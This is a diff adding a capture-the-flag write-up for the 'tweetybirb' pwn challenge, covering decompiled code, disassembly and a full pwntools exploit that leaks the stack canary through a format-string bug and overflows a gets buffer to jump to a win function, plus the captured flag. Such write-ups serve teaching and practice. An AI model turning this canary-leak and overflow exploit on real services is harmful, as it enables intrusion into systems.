@@ -263,3 +263,189 @@ kqctf{did_you_zoom_the_basic_buffer_overflow_?}
 
 
 # ==========================================================================================
+
+# Challenge name: tweetybirb
+
+### Description
+NamOcCho
+
+## Pseudocode
+```c
+int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  char format[72]; // [rsp+0h] [rbp-50h] BYREF
+  unsigned __int64 v5; // [rsp+48h] [rbp-8h]
+
+  v5 = __readfsqword(0x28u);
+  puts(
+    "What are these errors the compiler is giving me about gets and printf? Whatever, I have this little tweety birb prot"
+    "ectinig me so it's not like you hacker can do anything. Anyways, what do you think of magpies?");
+  gets(format, argv);
+  printf(format);
+  puts("\nhmmm interesting. What about water fowl?");
+  gets(format, argv);
+  return 0;
+}
+```
+
+## Assembly code
+```assembly
+.text:00000000004011F2 ; int __cdecl main(int argc, const char **argv, const char **envp)
+.text:00000000004011F2                 public main
+.text:00000000004011F2 main            proc near               ; DATA XREF: _start+21↑o
+.text:00000000004011F2
+.text:00000000004011F2 format          = byte ptr -50h
+.text:00000000004011F2 var_8           = qword ptr -8
+.text:00000000004011F2
+.text:00000000004011F2 ; __unwind {
+.text:00000000004011F2                 endbr64
+.text:00000000004011F6                 push    rbp
+.text:00000000004011F7                 mov     rbp, rsp
+.text:00000000004011FA                 sub     rsp, 50h
+.text:00000000004011FE                 mov     rax, fs:28h
+.text:0000000000401207                 mov     [rbp+var_8], rax
+.text:000000000040120B                 xor     eax, eax
+.text:000000000040120D                 lea     rdi, s          ; "What are these errors the compiler is g"...
+.text:0000000000401214                 call    _puts
+.text:0000000000401219                 lea     rax, [rbp+format]
+.text:000000000040121D                 mov     rdi, rax
+.text:0000000000401220                 mov     eax, 0
+.text:0000000000401225                 call    _gets
+.text:000000000040122A                 lea     rax, [rbp+format]
+.text:000000000040122E                 mov     rdi, rax        ; format
+.text:0000000000401231                 mov     eax, 0
+.text:0000000000401236                 call    _printf
+.text:000000000040123B                 lea     rdi, aHmmmInterestin ; "\nhmmm interesting. What about water fo"...
+.text:0000000000401242                 call    _puts
+.text:0000000000401247                 lea     rax, [rbp+format]
+.text:000000000040124B                 mov     rdi, rax
+.text:000000000040124E                 mov     eax, 0
+.text:0000000000401253                 call    _gets
+.text:0000000000401258                 mov     eax, 0
+.text:000000000040125D                 mov     rdx, [rbp+var_8]
+.text:0000000000401261                 xor     rdx, fs:28h
+.text:000000000040126A                 jz      short locret_401271
+.text:000000000040126C                 call    ___stack_chk_fail
+.text:0000000000401271 ; ---------------------------------------------------------------------------
+.text:0000000000401271
+.text:0000000000401271 locret_401271:                          ; CODE XREF: main+78↑j
+.text:0000000000401271                 leave
+.text:0000000000401272                 retn
+.text:0000000000401272 ; } // starts at 4011F2
+.text:0000000000401272 main            endp
+```
+
+## Checksec
+
+![image](https://user-images.githubusercontent.com/69805864/139622714-851f2975-b7b8-4bb0-b7dd-9f46b47ea4b6.png)
+
+
+## Methodology
+As we can see this challenge is similar to the previous challenge, but this challenge has stack canary. So we have to detect the canary value to bypass it.
+
+Exploit plan:
+1. Identify offset from our input to `return address` of stack
+2. Find canary value
+3. Overwrite `return address` of stack to redirect to win function
+
+## Exploit
+
+Base on the assembly code above, we have a stack like this:
+ 
+![image](https://user-images.githubusercontent.com/69805864/139623464-b8cd7c03-a7bc-4423-ae3b-0d6d240b8972.png)
+
+
+
+According the disassembly code of main we know that this is a Random XOR canary
+```assembly
+   0x00000000004011f2 <+0>:     endbr64 
+   0x00000000004011f6 <+4>:     push   rbp
+   0x00000000004011f7 <+5>:     mov    rbp,rsp
+   0x00000000004011fa <+8>:     sub    rsp,0x50
+   0x00000000004011fe <+12>:    mov    rax,QWORD PTR fs:0x28
+   0x0000000000401207 <+21>:    mov    QWORD PTR [rbp-0x8],rax
+   .......
+   0x0000000000401258 <+102>:   mov    eax,0x0
+   0x000000000040125d <+107>:   mov    rdx,QWORD PTR [rbp-0x8]
+=> 0x0000000000401261 <+111>:   xor    rdx,QWORD PTR fs:0x28       <==
+   0x000000000040126a <+120>:   je     0x401271 <main+127>
+   0x000000000040126c <+122>:   call   0x4010a0 <__stack_chk_fail@plt>
+   0x0000000000401271 <+127>:   leave  
+   0x0000000000401272 <+128>:   ret    
+
+```
+
+
+
+We can find the canary value by using %[offset]$p (brute force offset) via the format string vulnerable. Additionally, the canary value ends in 00 and looks very random, unlike the libc and stack addresses that start with f7 and ff
+
+![image](https://user-images.githubusercontent.com/69805864/139624575-aa3a0467-84e8-47bd-924f-ed165f6de453.png)
+
+Here is the code to brute force the offset
+```python
+from pwn import *
+
+for i in range(10, 16):
+  try:
+    sh = remote('143.198.184.186', 5002)
+    sh.sendlineafter('magpies?\n', '%{}$p'.format(i))
+    print (i, sh.recvline())
+    sh.close()
+  except EOFError:
+    pass
+
+```
+
+It appears to be at `%15$p`. Remember, stack canaries are randomised for each new process, so it won't be the same.
+
+![image](https://user-images.githubusercontent.com/69805864/139625250-4a2eea70-55af-4929-8f93-96ec6c30c417.png)
+
+
+Fortunately, there are 2 `gets` in program so the first input we use to get canary value and the second we use to send our payload.
+The format of payload like the stack above, it should be have first 72 bytes to padding to canary, next is 8 bytes of canary, next is 8 bytes to padding to return address and last 8 bytes to overwrite return address.
+
+### Exploit code
+
+```python
+from pwn import *
+
+LOCAL = 0
+
+if LOCAL:
+	r = process('./tweetybirb')
+	raw_input('>>')
+else:
+	r = remote('143.198.184.186', 5002)
+	
+flag = 0x4011DE
+offset = 72
+
+
+print(r.recv())
+
+r.sendline('%15$p')	# get canary value in the first gets
+canary = int(r.recvline(), 16)
+log.success(f'Canary: {hex(canary)}')
+
+
+pl = b'A' * offset
+pl += p64(canary)
+pl += b'B' * 8
+pl += p64(flag)
+
+print(r.recvline())
+r.sendline(pl)	# send payload in the second gets
+print(r.recvline())
+r.interactive()
+```
+
+Run the code and we wil get the flag
+
+![image](https://user-images.githubusercontent.com/69805864/139626811-d315312c-beb3-49c7-a319-640694ea8901.png)
+
+## Flag
+kqctf{tweet_tweet_did_you_leak_or_bruteforce_...\_plz_dont_say_you_tried_bruteforce}
+
+
+
+# ==========================================================================================
